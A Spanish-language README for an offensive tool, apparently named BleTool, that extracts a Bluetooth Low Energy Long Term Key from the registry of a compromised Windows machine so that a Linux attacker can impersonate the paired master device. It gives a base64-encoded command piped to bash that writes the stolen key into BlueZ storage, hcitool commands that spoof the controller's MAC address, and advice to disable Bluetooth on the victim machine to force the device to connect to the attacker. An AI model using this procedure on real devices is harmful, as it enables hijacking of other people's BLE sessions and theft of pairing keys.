## Estado del arte
Esta herramienta nace de una investigación sobre la reutilización de la clave Long Term Key (LTK) que utilizan los dispositivos BLE para el cifrado en las comunicaciones. En la investigación se ha descubierto que se puede hacer pasar por un dispositivo maestro y robar la sesión de emparejamiento entre el dispositivo maestro y esclavo, haciendo uso de la LTK y algunos parámetros más de configuración. 

Al utilizar esta herramienta se parte de la premisa de que un se ha conseguido permisos `NT Authority\\System` en un equipo Windows. Esta herramienta te va a ayudar a extraer la información necesaria para poder suplantar el dispositivo maestro. Esta información tendrá que ser configurada en un dispositivo Linux que soporte Bluez para llevar a cabo la suplantación.

## Requisitos
Los requisitos para poder llevar a cabo este ataque son los siguientes:
-	Tener instalada la pila bluez en dispositivo Linux, además de tener un controlador bluetooth en este. Para instalar Bluez en Ubuntu se puede ejecutar el siguiente comando.

```bash
sudo apt-get install bluez
```

- Tener privilegios NT Authority\\System en el equipo víctima.
- Tener privilegios de root en el equipo Linux (Atacante).

## Introducción
Esta herramienta te va a permitir extraer la información necesaria para suplantar un dispositivo de una forma muy sencilla. Esta información es extraída del registro de Windows y se necesitan privilegios NT Authority\\System para poder extraerla. La herramienta dispone de las siguientes opciones. 

![Opciones BleTool](https://user-images.githubusercontent.com/63710549/177043941-9f0f27b4-5f79-48de-ab09-e01e1590cca8.png)

-	--outputInfo --> Esta opción va a extraer la información del registro de Windows y va a escribir un fichero llamado "info" en el directorio actual donde se está ejecutando la herramienta. Este fichero info va a contener la información necesaria que va a necesitar un equipo Linux con bluez para poder configurar un dispositivo maestro.

![image](https://user-images.githubusercontent.com/63710549/177044740-c3a2da0f-8b6e-4698-8c6a-3fb6a55626aa.png)

-	--outputBase64 --> Esta opción va a generar uno o varios comandos de Linux que ejecutándolos va a permitir generar en el equipo atacante la estructura de directorios necesaria en /var/lib/bluetooth/ y el fichero info que contiene la información del dispositivo BLE. Esta es la opción recomendada y más cómoda para extraer la información.

![--outputBase64](https://user-images.githubusercontent.com/63710549/177044699-73ed0166-0038-4f83-b014-877666c434cf.png)

-	--verbose --> Esta opción te mostrará por pantalla la información que extrae la herramienta, además de mostrarte los mandos Linux como en la opción "--outputBase64".

![image](https://user-images.githubusercontent.com/63710549/177044832-f5c98822-1607-4ea1-8ce6-76a1ceadc4aa.png)

## Ejemplo de un Ataque
Una vez se poseen los privilegios necesarios sobre el sistema de la víctima y se tiene la herramienta en el equipo de la víctima, se procede a extraer la información con una de las dos opciones que más nos venga del ella. En este caso, para este ejemplo de demostración sé hace uso del comando de Linux, ya que facilita y acelera el trabajo mucho. El comando que se obtiene para ejeuctar es el siguiente.

```bash
echo 'bWtkaXIgLXAgL3Zhci9saWIvYmx1ZXRvb3RoLzdDOjc2OjM1OjY2OkRFOjk2L0U0OjEyOjM4OjgwOkY0OjU3LzsgZWNobyAtZSAnW0dlbmVyYWxdXG5OYW1lPU1pIFNpbGVudCBNb3VzZVxuQXBwZWFyYW5jZT0weDNjMlxuQWRkcmVzc1R5cGU9c3RhdGljXG5TdXBwb3J0ZWRUZWNobm9sb2dpZXM9TEVcblRydXN0ZWQ9ZmFsc2VcbkJsb2NrZWQ9ZmFsc2Vcbldha2VBbGxvd2VkPXRydWVcblNlcnZpY2VzPTAwMDAxODAwLTAwMDAtMTAwMC04MDAwLTAwODA1ZjliMzRmYjswMDAwMTgwMS0wMDAwLTEwMDAtODAwMC0wMDgwNWY5YjM0ZmI7MDAwMDE4MGEtMDAwMC0xMDAwLTgwMDAtMDA4MDVmOWIzNGZiOzAwMDAxODBmLTAwMDAtMTAwMC04MDAwLTAwODA1ZjliMzRmYjswMDAwMTgxMi0wMDAwLTEwMDAtODAwMC0wMDgwNWY5YjM0ZmI7MDAwMTAyMDMtMDQwNS0wNjA3LTA4MDktMGEwYjBjMGQxOTEwOzAwMDEwMjAzLTA0MDUtMDYwNy0wODA5LTBhMGIwYzBkMTkxMjtcblxuW0xvbmdUZXJtS2V5XVxuS2V5PTREQUQ4QjkwQUM4M0NBNjQ4QjExQTlBMDUwMTlFRkI0XG5BdXRoZW50aWNhdGVkPTBcbkVuY1NpemU9MTZcbkVEaXY9MjExNzBcblJhbmQ9MTcxODI1MjkxMzIzNDY2OTk2MzZcblxuW0RldmljZUlEXVxuU291cmNlPTJcblZlbmRvcj0xMDAwN1xuUHJvZHVjdD0yMDUwMFxuVmVyc2lvbj0yMDA0JyA+IC92YXIvbGliL2JsdWV0b290aC83Qzo3NjozNTo2NjpERTo5Ni9FNDoxMjozODo4MDpGNDo1Ny9pbmZv' | base64 -d | bash
```

Tras ejecutar el comando en el equipo de atacante, se va a crear los directorios y el fichero info.

![image](https://user-images.githubusercontent.com/63710549/177045341-2b22e559-dd95-4abf-ba59-ef86ea2778e3.png)

Ahora lo siguiente que hay que hacer es modificar la dirección MAC de nuestro controlador, para que esta sea la misma que la del controlador del equipo Windows del que hemos robado la información.

---

### Cambiar la MAC de tu controlador Bluetooth
Esta es una parte importante y esencial del ataque, ya que si no nuestro controlador no va a enviar un paquete de conexión al dispositivo BLE. Para realizar esto tenemos que escribir los siguientes comandos.

```bash

# 0x3f 0x01 -> Es el comando que se envia al controlador, esto no se moodifica.
# 0x00 0x20 0xc8 0xb8 0x48 0xe8 -> Es la MAC que quieres que tenga tu contolador, escrita en Little Endian, es decir alreves.
hcitool cmd 0x3f 0x01 0x96 0xde 0x66 0x35 0x76 0x7c

# hci0 -> Esto hace referencia al controlador. Esto equivadria al nombre de un interfaz de red. Se puede comprobar este nombre ejecuntando hciconfig.
hciconfig hci0 reset

```

Para comprobar si la MAC de tu controlador se ha cambiado correctamente, se puede ejecutar lo siguiente.

```bash

hciconfig

```

![image](https://user-images.githubusercontent.com/63710549/177045596-30e92106-8d40-4386-a2f2-7781fb615a47.png)

---

Después de modificar la MAC de controlador importante también reiniciar el servicio de Bluetooth para aplicar los cambios que hemos hecho con el comando en la ruta /var/lib/bluetooth.

```bash
systemctl restart bluetooth
```

Ahora ya estaría todo configurado en nuestro equipo para que una vez que el dispositivo BLE este dentro de nuestro rango, se conecte automáticamente a nosotros y robemos la sesión de emparejamiento.

![image](https://user-images.githubusercontent.com/63710549/177045895-08b5b855-52f6-4d13-8ba1-370f82dfb52f.png)

Para hacer más efectivo este ataque, se recomienda deshabilitar el bluetooth en el equipo del que se ha robado de información, para así forzar que si o si el dispositivo se conecte a nuestro equipo. Este ataque se ha basado en la teoría de implementación de Bluetooth Low Energy, solo se ha podido probar con un único dispositivo, pero como se realiza basándose en la teoría, este ataque debería ser posible con cualquier otro dispositivo.



